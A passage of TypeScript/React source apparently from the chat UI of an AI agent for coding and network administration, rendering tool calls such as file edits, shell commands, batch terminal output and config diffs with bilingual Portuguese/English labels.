    const dp = new Int32Array((m + 1) * cols);
    for (let i = m - 1; i >= 0; i--) {
      for (let j = n - 1; j >= 0; j--) {
        if (oldMid[i] === newMid[j]) {
          dp[i * cols + j] = dp[(i + 1) * cols + (j + 1)] + 1;
        } else {
          const down = dp[(i + 1) * cols + j];
          const right = dp[i * cols + (j + 1)];
          dp[i * cols + j] = down >= right ? down : right;
        }
      }
    }
    let i = 0;
    let j = 0;
    while (i < m && j < n) {
      if (oldMid[i] === newMid[j]) {
        out.push({ kind: "ctx", text: oldMid[i] });
        i += 1;
        j += 1;
      } else if (dp[(i + 1) * cols + j] >= dp[i * cols + (j + 1)]) {
        out.push({ kind: "del", text: oldMid[i] });
        i += 1;
      } else {
        out.push({ kind: "add", text: newMid[j] });
        j += 1;
      }
    }
    while (i < m) out.push({ kind: "del", text: oldMid[i++] });
    while (j < n) out.push({ kind: "add", text: newMid[j++] });
  } else {
    for (const text of oldMid) out.push({ kind: "del", text });
    for (const text of newMid) out.push({ kind: "add", text });
  }

  if (suffix > 0) {
    const ctxEnd = Math.min(suffix, DIFF_CTX_LINES);
    const sufStart = oldLines.length - suffix;
    for (let i = 0; i < ctxEnd; i++) out.push({ kind: "ctx", text: oldLines[sufStart + i] });
    if (suffix > ctxEnd) out.push({ kind: "hunk", text: `… ${suffix - ctxEnd} linha(s) abaixo` });
  }
  return out;
}

/** Diff de uma ferramenta de edição: o unificado da prévia quando vier, senão
 * montado dos argumentos (old_string/new_string, edits, content, patch). */
function editDiff(
  name: string,
  a: Record<string, unknown> | null,
  preview?: string,
): { list: DiffRow[]; numbers: boolean; added: number; removed: number } | null {
  if (preview && /^@@ -\d+/m.test(preview)) {
    const full = diffRows(preview);
    let added = 0;
    let removed = 0;
    for (const r of full) {
      if (r.kind === "add") added += 1;
      else if (r.kind === "del") removed += 1;
    }
    return { list: full.slice(0, MAX_DIFF_ROWS), numbers: true, added, removed };
  }
  if (!a) return null;
  const out: DiffRow[] = [];
  const appendPair = (oldS: unknown, newS: unknown) => {
    const oldArr = typeof oldS === "string" && oldS ? textLines(oldS) : [];
    const newArr = typeof newS === "string" && newS ? textLines(newS) : [];
    if (oldArr.length === 0 && newArr.length === 0) return;
    out.push(...computeLineDiff(oldArr, newArr));
  };
  if (name === "edit_file") appendPair(a.old_string, a.new_string);
  else if (name === "multi_edit" && Array.isArray(a.edits)) {
    const edits = a.edits as unknown[];
    edits.forEach((e, i) => {
      if (!e || typeof e !== "object") return;
      const ed = e as Record<string, unknown>;
      if (edits.length > 1) out.push({ kind: "hunk", text: `edição ${i + 1}` });
      appendPair(ed.old_string, ed.new_string);
    });
  } else if (name === "write_file") appendPair("", a.content);
  else if (name === "apply_patch" && typeof a.patch === "string") {
    for (const t of textLines(a.patch)) {
      if (/^\*\*\* (Begin|End) Patch/.test(t)) continue;
      if (t.startsWith("***") || t.startsWith("@@")) out.push({ kind: "hunk", text: t.replace(/^\*\*\* /, "") });
      else if (t[0] === "+") out.push({ kind: "add", text: t.slice(1) });
      else if (t[0] === "-") out.push({ kind: "del", text: t.slice(1) });
      else out.push({ kind: "ctx", text: t.slice(1) });
    }
  }
  if (!out.length) return null;
  let added = 0;
  let removed = 0;
  for (const r of out) {
    if (r.kind === "add") added += 1;
    else if (r.kind === "del") removed += 1;
  }
  return { list: out.slice(0, MAX_DIFF_ROWS), numbers: false, added, removed };
}

/** Saída mono rolável (240px). A primeira linha `exit N` do shell vira etiqueta. */
function ToolOutput({
  text,
  lang,
  exitTag,
  streaming = false,
}: {
  text: string;
  lang: string;
  exitTag: boolean;
  streaming?: boolean;
}) {
  const preRef = useRef<HTMLPreElement>(null);
  const pinnedRef = useRef(true);
  const m = exitTag ? /^exit (\S+)\r?\n?/.exec(text) : null;
  const rest = m ? text.slice(m[0].length) : text;

  useEffect(() => {
    const el = preRef.current;
    if (!el) return;
    const onScroll = () => {
      pinnedRef.current = el.scrollHeight - el.scrollTop - el.clientHeight < 24;
    };
    el.addEventListener("scroll", onScroll, { passive: true });
    return () => el.removeEventListener("scroll", onScroll);
  }, []);

  useEffect(() => {
    const el = preRef.current;
    if (streaming && pinnedRef.current && el) {
      el.scrollTop = el.scrollHeight;
    }
  }, [rest, streaming]);

  return (
    <div className="tool-out-wrap">
      {m ? <span className={"tool-exit " + (m[1] === "0" ? "ok" : "fail")}>exit {m[1]}</span> : null}
      {rest.trim() ? (
        <pre ref={preRef} className="tool-out">
          <HighlightedCode lang={lang} text={rest} />
        </pre>
      ) : null}
    </div>
  );
}

function stripCodeFence(raw: string): string {
  const lines = raw.replace(/\r\n/g, "\n").trim().split("\n");
  if (lines.length > 0 && /^```[a-zA-Z0-9_-]*\s*$/.test(lines[0].trim())) {
    lines.shift();
    if (lines.length > 0 && lines[lines.length - 1].trim() === "```") {
      lines.pop();
    }
  }
  return lines.join("\n").trim();
}

interface BatchSection {
  title: string;
  body: string;
  durationMs: string | null;
  isErr: boolean;
}

function parseBatchSections(raw: string): { preamble: string; sections: BatchSection[] } | null {
  const firstHeading = /^### /m.exec(raw);
  if (!firstHeading) return null;
  const preamble = raw.slice(0, firstHeading.index).trim();
  const rest = raw.slice(firstHeading.index);
  const parts = rest.split(/^### /m).filter((p) => p.length > 0);
  if (!parts.length) return null;

  const sections: BatchSection[] = parts.map((part) => {
    const nl = part.indexOf("\n");
    const rawHeader = (nl >= 0 ? part.slice(0, nl) : part).trim();
    const rawBody = nl >= 0 ? part.slice(nl + 1) : "";
    const body = stripCodeFence(rawBody);

    let title = rawHeader;
    let durationMs: string | null = null;
    let headerErr = false;

    // Parse `(host · 42 ms)` or `(42ms)` or `(host · ERRO)`
    const parenMatch = /^(.*?)\s*\(([^)]+)\)\s*$/.exec(rawHeader);
    if (parenMatch) {
      const base = parenMatch[1].trim();
      const segs = parenMatch[2].split(/\s*·\s*/).map((s) => s.trim()).filter(Boolean);
      const kept: string[] = [];
      for (const seg of segs) {
        const msMatch = /^(\d+\s*ms)$/i.exec(seg);
        if (msMatch) {
          durationMs = msMatch[1].replace(/\s+/g, "");
        } else if (/^(erro|error|fail|failed)$/i.test(seg)) {
          headerErr = true;
        } else {
          kept.push(seg);
        }
      }
      title = kept.length ? `${base} (${kept.join(" · ")})` : base;
    } else {
      const trailingMs = /^(.*?)\s+(\d+\s*ms)\s*$/i.exec(rawHeader);
      if (trailingMs) {
        title = trailingMs[1].trim();
        durationMs = trailingMs[2].replace(/\s+/g, "");
      }
    }

    const bodyErr =
      /^\[(?:não enviado|cancelado|sessão encerrou|lote interrompido)/im.test(body) ||
      /^(?:erro:|% Invalid|Error:|syntax error|timed out|failed)/im.test(body);

    return {
      title: title || rawHeader,
      body,
      durationMs,
      isErr: headerErr || bodyErr,
    };
  });

  return { preamble, sections };
}

function BatchSectionRow({ section, defaultOpen }: { section: BatchSection; defaultOpen: boolean }) {
  const lang = useLang();
  const [open, setOpen] = useState(defaultOpen);
  return (
    <div className={"tool-batch-item" + (open ? " open" : "") + (section.isErr ? " err" : "")}>
      <div className="tool-batch-head-row">
        <button
          type="button"
          className="tool-batch-head"
          aria-expanded={open}
          onClick={() => setOpen((v) => !v)}
        >
          <ChevronRight size={13} strokeWidth={2} className="chev" />
          <span
            className={"tool-batch-status " + (section.isErr ? "err" : "ok")}
            aria-label={section.isErr ? tr(lang, "Erro", "Error") : tr(lang, "OK", "OK")}
          >
            {section.isErr ? <X size={13} strokeWidth={2.25} /> : <Check size={13} strokeWidth={2.25} />}
          </span>
          <span className="tool-batch-title" title={section.title}>
            {section.title}
          </span>
          {section.durationMs ? <span className="tool-batch-ms">{section.durationMs}</span> : null}
        </button>
        {section.body ? <CopyButton text={section.body} /> : null}
      </div>
      {open ? (
        <div className="tool-batch-body">
          {section.body ? (
            <pre className="tool-out">
              <HighlightedCode lang="net" text={section.body} />
            </pre>
          ) : (
            <span className="tool-batch-preamble">{tr(lang, "(sem saída)", "(no output)")}</span>
          )}
        </div>
      ) : null}
    </div>
  );
}

function NetDiffBody({ out, streaming }: { out: string; streaming: boolean }) {
  const lang = useLang();
  const parsed = useMemo(() => {
    const rbMarker = /^###\s+Rollback[^\n]*$/im.exec(out);
    const diffPart = (rbMarker ? out.slice(0, rbMarker.index) : out).trim();
    const rollbackRaw = rbMarker ? out.slice(rbMarker.index + rbMarker[0].length) : "";
    const rollback = rollbackRaw ? stripCodeFence(rollbackRaw) : "";

    const rowsList: DiffRow[] = [];
    let summary: string | null = null;
    for (const line of diffPart.replace(/\r\n/g, "\n").split("\n")) {
      if (!line.trim()) continue;
      if (/^##\s+/.test(line)) {
        summary = line.replace(/^##\s+/, "").trim();
      } else if (/^\[[+\-~]\s+bloco/i.test(line)) {
        rowsList.push({ kind: "hunk", text: line });
      } else if (/^\s{0,2}\+\s/.test(line)) {
        rowsList.push({ kind: "add", text: line.replace(/^\s{0,2}\+\s/, "") });
      } else if (/^\s{0,2}-\s/.test(line)) {
        rowsList.push({ kind: "del", text: line.replace(/^\s{0,2}-\s/, "") });
      } else {
        rowsList.push({ kind: "ctx", text: line });
      }
    }
    const hasChanges = rowsList.some((r) => r.kind === "add" || r.kind === "del");
    return { summary, rowsList, hasChanges, rollback };
  }, [out]);

  return (
    <>
      {parsed.summary ? <p className="tool-batch-preamble">{parsed.summary}</p> : null}
      {parsed.hasChanges ? (
        <div className="tool-diff">
          <DiffLines list={parsed.rowsList.slice(0, MAX_DIFF_ROWS)} numbers={false} />
        </div>
      ) : (
        <ToolOutput text={out} lang="net" exitTag={false} streaming={streaming} />
      )}
      {parsed.rollback ? (
        <div className="tool-rollback">
          <div className="tool-rollback-head">
            <span className="tool-rollback-title">
              {tr(lang, "Rollback sugerido", "Suggested rollback")}
            </span>
            <CopyButton text={parsed.rollback} label={tr(lang, "Copiar rollback", "Copy rollback")} />
          </div>
          <pre className="tool-out">
            <HighlightedCode lang="net" text={parsed.rollback} />
          </pre>
        </div>
      ) : null}
    </>
  );
}

/** Corpo aberto de uma ferramenta, conforme o tipo: comando + saída, diff,
 * arquivo realçado pela extensão, Python execute_code, lote ou JSON. */
function ToolBody(props: {
  row: ToolRow;
  argsObj: Record<string, unknown> | null;
  parsed: unknown;
  path: string | null;
  out: string | undefined;
}) {
  const lang = useLang();
  const { row, argsObj, out } = props;
  const streaming = row.ok === undefined;

  if (row.name === "execute_code") {
    const code = typeof argsObj?.code === "string" ? argsObj.code : "";
    const copyVal = out ?? code;
    return (
      <div className="tool-detail">
        {code ? (
          <pre className="tool-out">
            <HighlightedCode lang="py" text={code} />
          </pre>
        ) : null}
        {out ? <ToolOutput text={out} lang="" exitTag streaming={streaming} /> : null}
        {copyVal ? (
          <div className="tool-detail-actions">
            {code && out ? <CopyButton text={code} label={tr(lang, "Copiar código", "Copy code")} /> : null}
            <CopyButton text={copyVal} label={tr(lang, "Copiar", "Copy")} />
          </div>
        ) : null}
      </div>
    );
  }

  if (row.name === "view_image" && props.path) {
    const fileBase = props.path.split(/[\\/]/).pop() ?? props.path;
    return (
      <div className="tool-detail">
        <div className="tool-image-preview">
          <MdImage src={props.path} alt={fileBase} />
        </div>
        {out ? <ToolOutput text={out} lang="" exitTag={false} streaming={streaming} /> : null}
        <div className="tool-detail-actions">
          <CopyButton text={out ?? props.path} label={tr(lang, "Copiar", "Copy")} />
        </div>
      </div>
    );
  }

  if (row.name === "net_diff") {
    const copyVal = out ?? (props.parsed ? JSON.stringify(props.parsed, null, 2) : row.args);
    return (
      <div className="tool-detail">
        {out ? (
          <NetDiffBody out={out} streaming={streaming} />
        ) : props.parsed ? (
          <pre className="tool-out tool-args">
            <HighlightedCode lang="json" text={JSON.stringify(props.parsed, null, 2)} />
          </pre>
        ) : null}
        {copyVal ? (
          <div className="tool-detail-actions">
            <CopyButton text={copyVal} label={tr(lang, "Copiar", "Copy")} />
          </div>
        ) : null}
      </div>
    );
  }

  if (BATCH_TOOLS.has(row.name)) {
    const cmd = commandOf(argsObj);
    const batch = out ? parseBatchSections(out) : null;
    if (batch) {
      return (
        <div className="tool-detail">
          {cmd ? (
            <div className="tool-cmd">
              <span className="tool-prompt" aria-hidden>
                $
              </span>
              <code>
                <HighlightedCode lang="net" text={cmd} />
              </code>
            </div>
          ) : null}
          {batch.preamble ? <p className="tool-batch-preamble">{batch.preamble}</p> : null}
          <div className="tool-batch-list">
            {batch.sections.map((s, idx) => (
              <BatchSectionRow key={`${idx}-${s.title}`} section={s} defaultOpen={s.isErr || batch.sections.length <= 1} />
            ))}
          </div>
          <div className="tool-detail-actions">
            <CopyButton text={out ?? cmd ?? row.args} label={tr(lang, "Copiar", "Copy")} />
          </div>
        </div>
      );
    }
  }

  if (isShellTool(row.name)) {
    const cmd = commandOf(argsObj);
    const codeLang = /^(net_|terminal_)/.test(row.name) ? "net" : "sh";
    const copyVal = out ?? cmd ?? row.args;
    return (
      <div className="tool-detail">
        {cmd ? (
          <div className="tool-cmd">
            <span className="tool-prompt" aria-hidden>
              $
            </span>
            <code>
              <HighlightedCode lang={codeLang} text={cmd} />
            </code>
          </div>
        ) : null}
        {out ? <ToolOutput text={out} lang={codeLang === "net" ? "net" : ""} exitTag streaming={streaming} /> : null}
        {copyVal ? (
          <div className="tool-detail-actions">
            {cmd && out ? <CopyButton text={cmd} label={tr(lang, "Copiar comando", "Copy command")} /> : null}
            <CopyButton text={copyVal} label={tr(lang, "Copiar", "Copy")} />
          </div>
        ) : null}
      </div>
    );
  }

  if (EDIT_TOOLS.has(row.name)) {
    const diff = editDiff(row.name, argsObj, row.preview);
    const copyVal = out ?? (typeof argsObj?.new_string === "string" ? argsObj.new_string : row.args);
    return (
      <div className="tool-detail">
        {diff ? (
          <div className="tool-diff">
            <DiffLines list={diff.list} numbers={diff.numbers} />
          </div>
        ) : null}
        {out && !diff?.numbers ? <ToolOutput text={out} lang="" exitTag={false} streaming={streaming} /> : null}
        {copyVal ? (
          <div className="tool-detail-actions">
            <CopyButton text={copyVal} label={tr(lang, "Copiar", "Copy")} />
          </div>
        ) : null}
      </div>
    );
  }

  if (READ_TOOLS.has(row.name) || row.name === "lsp" || row.name.startsWith("lsp_")) {
    const base = props.path?.split(/[\\/]/).pop() ?? "";
    const ext = base.includes(".") ? (base.split(".").pop() ?? "") : "";
    const searchTerm =
      typeof argsObj?.pattern === "string"
        ? argsObj.pattern
        : typeof argsObj?.query === "string"
          ? argsObj.query
          : typeof argsObj?.symbol === "string"
            ? argsObj.symbol
            : null;
    const copyVal = out ?? (props.parsed ? JSON.stringify(props.parsed, null, 2) : row.args);
    return (
      <div className="tool-detail">
        {searchTerm || (row.name !== "read_file" && props.path) ? (
          <div className="tool-subhead">
            {searchTerm ? (
              <span>
                <span className="tool-subhead-key">{tr(lang, "busca:", "query:")} </span>
                <span className="tool-subhead-val">{searchTerm}</span>
              </span>
            ) : null}
            {row.name !== "read_file" && props.path ? (
              <span>
                <span className="tool-subhead-key">{tr(lang, "em:", "in:")} </span>
                <span className="tool-subhead-val">{props.path}</span>
              </span>
            ) : null}
          </div>
        ) : null}
        {out ? <ToolOutput text={out} lang={ext} exitTag={false} streaming={streaming} /> : null}
        {copyVal ? (
          <div className="tool-detail-actions">
            <CopyButton text={copyVal} label={tr(lang, "Copiar", "Copy")} />
          </div>
        ) : null}
      </div>
    );
  }

  const hasArgs =
    props.parsed !== null && typeof props.parsed === "object" && Object.keys(props.parsed).length > 0;
  const outJson = out ? /^\s*[[{]/.test(out) && parseArgs(out) !== null : false;
  const outLang = outJson ? "json" : row.name.startsWith("net_") ? "net" : "";
  const copyVal = out ?? (hasArgs ? JSON.stringify(props.parsed, null, 2) : row.args);
  return (
    <div className="tool-detail">
      {hasArgs ? (
        <pre className="tool-out tool-args">
          <HighlightedCode lang="json" text={JSON.stringify(props.parsed, null, 2)} />
        </pre>
      ) : !out && row.args ? (
        <pre className="tool-out tool-args">{row.args}</pre>
      ) : null}
      {out ? <ToolOutput text={out} lang={outLang} exitTag={false} streaming={streaming} /> : null}
      {copyVal ? (
        <div className="tool-detail-actions">
          <CopyButton text={copyVal} label={tr(lang, "Copiar", "Copy")} />
        </div>
      ) : null}
    </div>
  );
}

const FILE_TOOLS = new Set([
  "read_file",
  "edit_file",
  "multi_edit",
  "write_file",
  "apply_patch",
  "view_image",
  "diagnostics",
  "lsp",
  "lsp_definition",
  "lsp_references",
  "lsp_hover",
  "lsp_symbols",
  "lsp_implementation",
  "lsp_rename",
]);

function toolActionLabel(name: string, lang: Lang): string {
  switch (name) {
    case "read_file":
    case "diagnostics":
    case "lsp":
    case "lsp_definition":
    case "lsp_references":
    case "lsp_hover":
    case "lsp_symbols":
    case "lsp_implementation":
    case "lsp_rename":
      return tr(lang, "Analisou", "Analyzed");
    case "view_image":
      return tr(lang, "Visualizou", "Viewed");
    case "edit_file":
    case "multi_edit":
    case "apply_patch":
      return tr(lang, "Editou", "Edited");
    case "write_file":
      return tr(lang, "Criou", "Created");
    case "grep":
    case "glob":
    case "repo_map":
    case "web_search":
    case "skill_search":
    case "session_search":
      return tr(lang, "Buscou", "Searched");
    case "web_fetch":
      return tr(lang, "Buscou URL", "Fetched");
    case "list_dir":
      return tr(lang, "Listou", "Listed");
    case "shell":
    case "bash":
    case "powershell":
    case "remote_shell":
    case "monitor":
      return tr(lang, "Executou", "Ran");
    case "execute_code":
      return tr(lang, "Executou código", "Executed code");
    case "net_connect":
      return tr(lang, "Conectou", "Connected");
    case "terminal_batch":
    case "net_broadcast":
      return tr(lang, "Executou em lote", "Batch ran");
    case "terminal_open":
      return tr(lang, "Abriu terminal", "Opened terminal");
    case "terminal_send":
      return tr(lang, "Enviou comando", "Sent command");
    case "net_inventory":
      return tr(lang, "Inventário", "Inventory");
    case "net_probe":
      return tr(lang, "Sondagem", "Probed");
    case "net_path":
      return tr(lang, "Rota", "Traced");
    case "net_vpn":
      return tr(lang, "VPN", "VPN");
    case "net_transfer":
      return tr(lang, "Transferiu", "Transferred");
    case "net_backup":
      return tr(lang, "Backup", "Backed up");
    case "net_diff":
      return tr(lang, "Comparou config", "Config diff");
    case "net_snmp":
      return tr(lang, "Consultar SNMP", "SNMP query");
    case "net_api":
      return tr(lang, "API de rede", "Network API");
    case "net_zabbix":
      return tr(lang, "Consultar Zabbix", "Zabbix query");
    case "agent":
      return tr(lang, "Delegou", "Delegated");
    case "agent_manage":
      return tr(lang, "Agente", "Agent");
    case "skill":
    case "skill_load":
      return tr(lang, "Carregou skill", "Loaded skill");
    case "memory":
    case "memory_save":
    case "memory_update":
    case "memory_forget":
    case "memory_recall":
      return tr(lang, "Memória", "Memory");
    case "process":
      return tr(lang, "Processo", "Process");
    case "sleep":
      return tr(lang, "Aguardou", "Waited");
    case "task_create":
    case "task_update":
    case "task_get":
      return tr(lang, "Tarefa", "Task");
    case "task_list":
      return tr(lang, "Tarefas", "Tasks");
    default:
      return name;
  }
}

function toolSubAction(name: string, a: Record<string, unknown> | null, lang: Lang): string | null {
  const act = typeof a?.action === "string" ? a.action.toLowerCase() : typeof a?.op === "string" ? a.op.toLowerCase() : "";
  if (name === "memory" || name.startsWith("memory_")) {
    const k = act || name.replace(/^memory_/, "");
    if (k === "save" || k === "add") return tr(lang, "salvar", "save");
    if (k === "search" || k === "recall" || k === "query") return tr(lang, "buscar", "search");
    if (k === "forget" || k === "delete" || k === "remove") return tr(lang, "esquecer", "forget");
    if (k === "list") return tr(lang, "listar", "list");
    if (k === "update") return tr(lang, "atualizar", "update");
    return k || null;
  }
  if (name === "lsp" || name.startsWith("lsp_")) {
    const k = act || name.replace(/^lsp_/, "");
    if (k === "definition") return tr(lang, "definição", "definition");
    if (k === "references") return tr(lang, "referências", "references");
    if (k === "symbols" || k === "document_symbols" || k === "workspace_symbols") return tr(lang, "símbolos", "symbols");
    if (k === "hover") return tr(lang, "hover", "hover");
    if (k === "implementation") return tr(lang, "implementação", "implementation");
    if (k === "rename") return tr(lang, "renomear", "rename");
    return k || null;
  }
  if (name === "process") {
    if (act === "list") return tr(lang, "listar", "list");
    if (act === "output" || act === "read" || act === "log" || act === "poll") return tr(lang, "saída", "output");
    if (act === "kill" || act === "stop" || act === "terminate") return tr(lang, "encerrar", "kill");
    return act || null;
  }
  if (name === "agent_manage") {
    if (act === "list") return tr(lang, "listar", "list");
    if (act === "create") return tr(lang, "criar", "create");
    if (act === "update") return tr(lang, "atualizar", "update");
    if (act === "delete" || act === "remove") return tr(lang, "remover", "delete");
    if (act === "get") return tr(lang, "detalhes", "get");
    return act || null;
  }
  if (name === "net_inventory") {
    if (act === "list") return tr(lang, "listar", "list");
    if (act === "get") return tr(lang, "detalhes", "get");
    if (act === "add" || act === "create") return tr(lang, "adicionar", "add");
    if (act === "update") return tr(lang, "atualizar", "update");
    if (act === "remove" || act === "delete") return tr(lang, "remover", "remove");
    if (act === "discover" || act === "scan") return tr(lang, "descobrir", "discover");
    return act || null;
  }
  if (name === "net_vpn") {
    if (act === "status") return tr(lang, "status", "status");
    if (act === "up" || act === "connect") return tr(lang, "conectar", "up");
    if (act === "down" || act === "disconnect") return tr(lang, "desconectar", "down");
    if (act === "list" || act === "peers" || act === "tunnels") return tr(lang, "listar", "list");
    return act || null;
  }
  if (name === "net_snmp") {
    const preset = typeof a?.preset === "string" && a.preset.trim() ? a.preset.trim() : "";
    return preset || act || null;
  }
  if (name === "net_api") {
    const method = typeof a?.method === "string" && a.method.trim() ? a.method.trim().toUpperCase() : "";
    return method || (a ? "GET" : null);
  }
  if (name === "net_zabbix") {
    return act || null;
  }
  if (name.startsWith("task_")) {
    const k = name.replace(/^task_/, "");
    if (k === "create") return tr(lang, "criar", "create");
    if (k === "update") return tr(lang, "atualizar", "update");
    if (k === "list") return tr(lang, "listar", "list");
    if (k === "get") return tr(lang, "detalhes", "get");
  }
  return null;
}

function computeFileLineRange(name: string, argsObj: Record<string, unknown> | null, preview?: string): string | null {
  if (name === "lsp" || name.startsWith("lsp_")) {
    const line = typeof argsObj?.line === "number" && argsObj.line >= 1 ? Math.floor(argsObj.line) : null;
    return line ? `#L${line}` : null;
  }
  if (name !== "read_file") return null;
  const offset = typeof argsObj?.offset === "number" && argsObj.offset >= 1 ? Math.floor(argsObj.offset) : 1;
  const limit = typeof argsObj?.limit === "number" && argsObj.limit >= 1 ? Math.floor(argsObj.limit) : null;
  if (preview) {
    const m = /\[linhas\s+(\d+)-(\d+)\s+de\s+\d+/i.exec(preview);
    if (m) return `#L${m[1]}-${m[2]}`;
    const nums = [...preview.matchAll(/^(\d+)\t/gm)].map((x) => Number(x[1]));
    if (nums.length > 0) {
      const first = nums[0];
      const last = limit ? Math.max(nums[nums.length - 1], first + limit - 1) : nums[nums.length - 1];
      return `#L${first}-${last}`;
    }
  }
  if (limit) {
    return `#L${offset}-${offset + limit - 1}`;
  }
  return `#L${offset}`;
}

function summarizeNetTool(name: string, argsObj: Record<string, unknown>): string | null {
  const str = (k: string) => (typeof argsObj[k] === "string" && argsObj[k].trim() ? (argsObj[k] as string).trim() : "");
  if (name === "net_transfer") {
    const src = str("src") || str("source") || str("local_path");
    const dst = str("dst") || str("dest") || str("remote_path") || str("host");
    if (src && dst) return `${src} → ${dst}`;
  }
  if (name === "net_diff") {
    const before = str("before") || str("a") || str("host");
    const after = str("after") || str("b");
    if (before && after) return `${before} ↔ ${after}`;
  }
  if (name === "net_snmp") {
    const target = str("device") || str("host") || str("target");
    const what =
      str("preset") ||
      str("oid") ||
      (Array.isArray(argsObj.oids)
        ? argsObj.oids
            .filter((o): o is string => typeof o === "string" && o.trim().length > 0)
            .slice(0, 2)
            .join(", ")
        : "");
    if (target && what) return `${target} · ${what}`;
    return target || what || null;
  }
  if (name === "net_api") {
    const method = (str("method") || "GET").toUpperCase();
    const target = str("device") || str("url") || str("base_url") || str("host");
    const path = str("path") || str("endpoint");
    const dest = target && path && !target.includes(path) ? `${target} ${path}` : target || path;
    return dest ? `${method} ${dest}` : method;
  }
  if (name === "net_zabbix") {
    const action = str("action");
    const target =
      str("host") ||
      str("host_filter") ||
      str("group") ||
      str("url") ||
      str("trigger_id") ||
      str("event_id") ||
      str("method");
    if (action && target) return `${action} · ${target}`;
    return target || action || null;
  }
  const host = str("host") || str("device") || str("target") || str("destination") || str("name") || str("group");
  if (host) return host;
  if (Array.isArray(argsObj.hosts) && argsObj.hosts.length > 0) {
    return argsObj.hosts.filter((h): h is string => typeof h === "string").join(", ");
  }
  return null;
}

const ToolLine = memo(function ToolLine({ row, sessionId }: { row: ToolRow; sessionId?: string | null }) {
  const lang = useLang();
  const [open, setOpen] = useState(false);
  const Icon = useMemo(() => toolIcon(row.name), [row.name]);
  const parsed = useMemo(() => parseArgs(row.args), [row.args]);
  const argsObj = useMemo(
    () => (parsed && typeof parsed === "object" ? (parsed as Record<string, unknown>) : null),
    [parsed],
  );
  const arg = useMemo(() => {
    if (row.name === "sleep" && argsObj?.seconds != null) {
      return `${argsObj.seconds}s`;
    }
    if (row.name === "execute_code" && argsObj) {
      const desc = typeof argsObj.description === "string" ? argsObj.description.trim() : "";
      if (desc) return desc;
      if (typeof argsObj.code === "string") {
        const firstLine = argsObj.code
          .split(/\r?\n/)
          .map((l) => l.trim())
          .find((l) => l && !l.startsWith("#"));
        return firstLine ?? argsObj.code.replace(/\s+/g, " ").trim();
      }
    }
    if (row.name.startsWith("net_") && !isShellTool(row.name) && argsObj) {
      const netSum = summarizeNetTool(row.name, argsObj);
      if (netSum) return netSum;
    }
    let summary = argSummaryFromParsed(parsed, row.args);
    if (row.name === "agent" && argsObj) {
      const role = typeof argsObj.agent === "string" ? argsObj.agent.trim() : "";
      const desc = typeof argsObj.description === "string" ? argsObj.description.trim() : "";
      if (role && desc) summary = `${role}: ${desc}`;
      else if (desc || role) summary = desc || role;
    }
    return summary;
  }, [parsed, argsObj, row.args, row.name]);
  const rawPath = useMemo(() => {
    const direct =
      typeof argsObj?.path === "string"
        ? argsObj.path
        : typeof argsObj?.file_path === "string"
          ? argsObj.file_path
          : typeof argsObj?.filePath === "string"
            ? argsObj.filePath
            : null;
    if (direct) return direct;
    if (row.name === "apply_patch" && typeof argsObj?.patch === "string") {
      const m = /^\*\*\* (?:Update|Add|Delete) File:\s*(.+)$/m.exec(argsObj.patch);
      if (m) return m[1].trim();
    }
    return null;
  }, [argsObj, row.name]);
  const isFileTool = FILE_TOOLS.has(row.name) && Boolean(rawPath);
  const lineRange = useMemo(
    () => (isFileTool ? computeFileLineRange(row.name, argsObj, row.preview) : null),
    [isFileTool, row.name, argsObj, row.preview],
  );
  const diffStats = useMemo(() => {
    if (!EDIT_TOOLS.has(row.name)) return null;
    const d = editDiff(row.name, argsObj, row.preview);
    if (!d || (d.added === 0 && d.removed === 0)) return null;
    return { added: d.added, removed: d.removed };
  }, [row.name, argsObj, row.preview]);
  const subAction = useMemo(() => toolSubAction(row.name, argsObj, lang), [row.name, argsObj, lang]);
  const extraSearchTerm = useMemo(() => {
    if (!isFileTool || !(row.name === "lsp" || row.name.startsWith("lsp_"))) return null;
    const sym = typeof argsObj?.symbol === "string" ? argsObj.symbol : typeof argsObj?.query === "string" ? argsObj.query : "";
    return sym.trim() || null;
  }, [isFileTool, row.name, argsObj]);
  const body = useMemo(
    () => row.preview ?? row.progress ?? (parsed ? JSON.stringify(parsed, null, 2) : row.args),
    [row.preview, row.progress, parsed, row.args],
  );
  const state = row.ok === undefined ? "run" : row.ok ? "ok" : "fail";
  const liveTail =
    state === "run" && row.progress
      ? row.progress.split(/\r?\n/).slice(-8).join("\n")
      : null;
  const fileBase = rawPath ? (rawPath.split(/[\\/]/).pop() ?? rawPath) : "";
  const label = toolActionLabel(row.name, lang);
  const firstLine = lineRange ? Number(lineRange.match(/\d+/)?.[0]) || undefined : undefined;
  return (
    <div className={`tool ${state}` + (open ? " open" : "")}>
      <div className="tool-row">
      <button className="tool-head" onClick={() => setOpen(!open)} aria-expanded={open} disabled={!body}>
        {!isFileTool ? (
          <span className="tool-icon">
            <Icon size={14} strokeWidth={2} />
          </span>
        ) : null}
        <span className="tool-name">{label}</span>
        {subAction ? <span className="tool-sub-pill">{subAction}</span> : null}
        {isFileTool && rawPath ? (
          <span className="tool-file" title={rawPath}>
            <FileLangBadge path={rawPath} />
            <span className="tool-file-name">{fileBase}</span>
            {lineRange ? <span className="tool-range">{lineRange}</span> : null}
          </span>
        ) : (
          <span className="tool-arg" title={arg}>
            {arg}
          </span>
        )}
        {extraSearchTerm ? (
          <span className="tool-arg" title={extraSearchTerm}>
            {extraSearchTerm}
          </span>
        ) : null}
        {isFileTool && !extraSearchTerm ? <span className="spacer" /> : null}
        {diffStats ? (
          <span className="tool-diff-stats" aria-label={`+${diffStats.added} -${diffStats.removed}`}>
            {diffStats.added > 0 ? <span className="tool-stat-add">+{diffStats.added}</span> : null}
            {diffStats.removed > 0 ? <span className="tool-stat-del">−{diffStats.removed}</span> : null}
          </span>
        ) : null}
        <span className="tool-state" role="img" aria-label={STATE_LABEL[state]}>
          {state === "run" ? (
            <span className="spinner" />
          ) : state === "ok" ? (
            <Check size={14} strokeWidth={2.25} />
          ) : (
            <X size={14} strokeWidth={2.25} />
          )}
        </span>
        <ChevronRight size={14} strokeWidth={2} className="chev" />
      </button>
      {isFileTool && rawPath ? (
        <button
          className="tool-open"
          title={tr(lang, "Abrir no editor (VS Code)", "Open in editor (VS Code)")}
          aria-label={tr(lang, `Abrir ${fileBase} no editor`, `Open ${fileBase} in editor`)}
          onClick={() => void api.openInEditor(rawPath, sessionId, firstLine).catch(() => undefined)}
        >
          <ExternalLink size={13} strokeWidth={2} />
        </button>
      ) : null}
      </div>
      {liveTail && !open ? <pre className="tool-body live">{liveTail}</pre> : null}
      {open && body ? (
        <ToolBody row={row} argsObj={argsObj} parsed={parsed} path={rawPath} out={row.preview ?? row.progress} />
      ) : null}
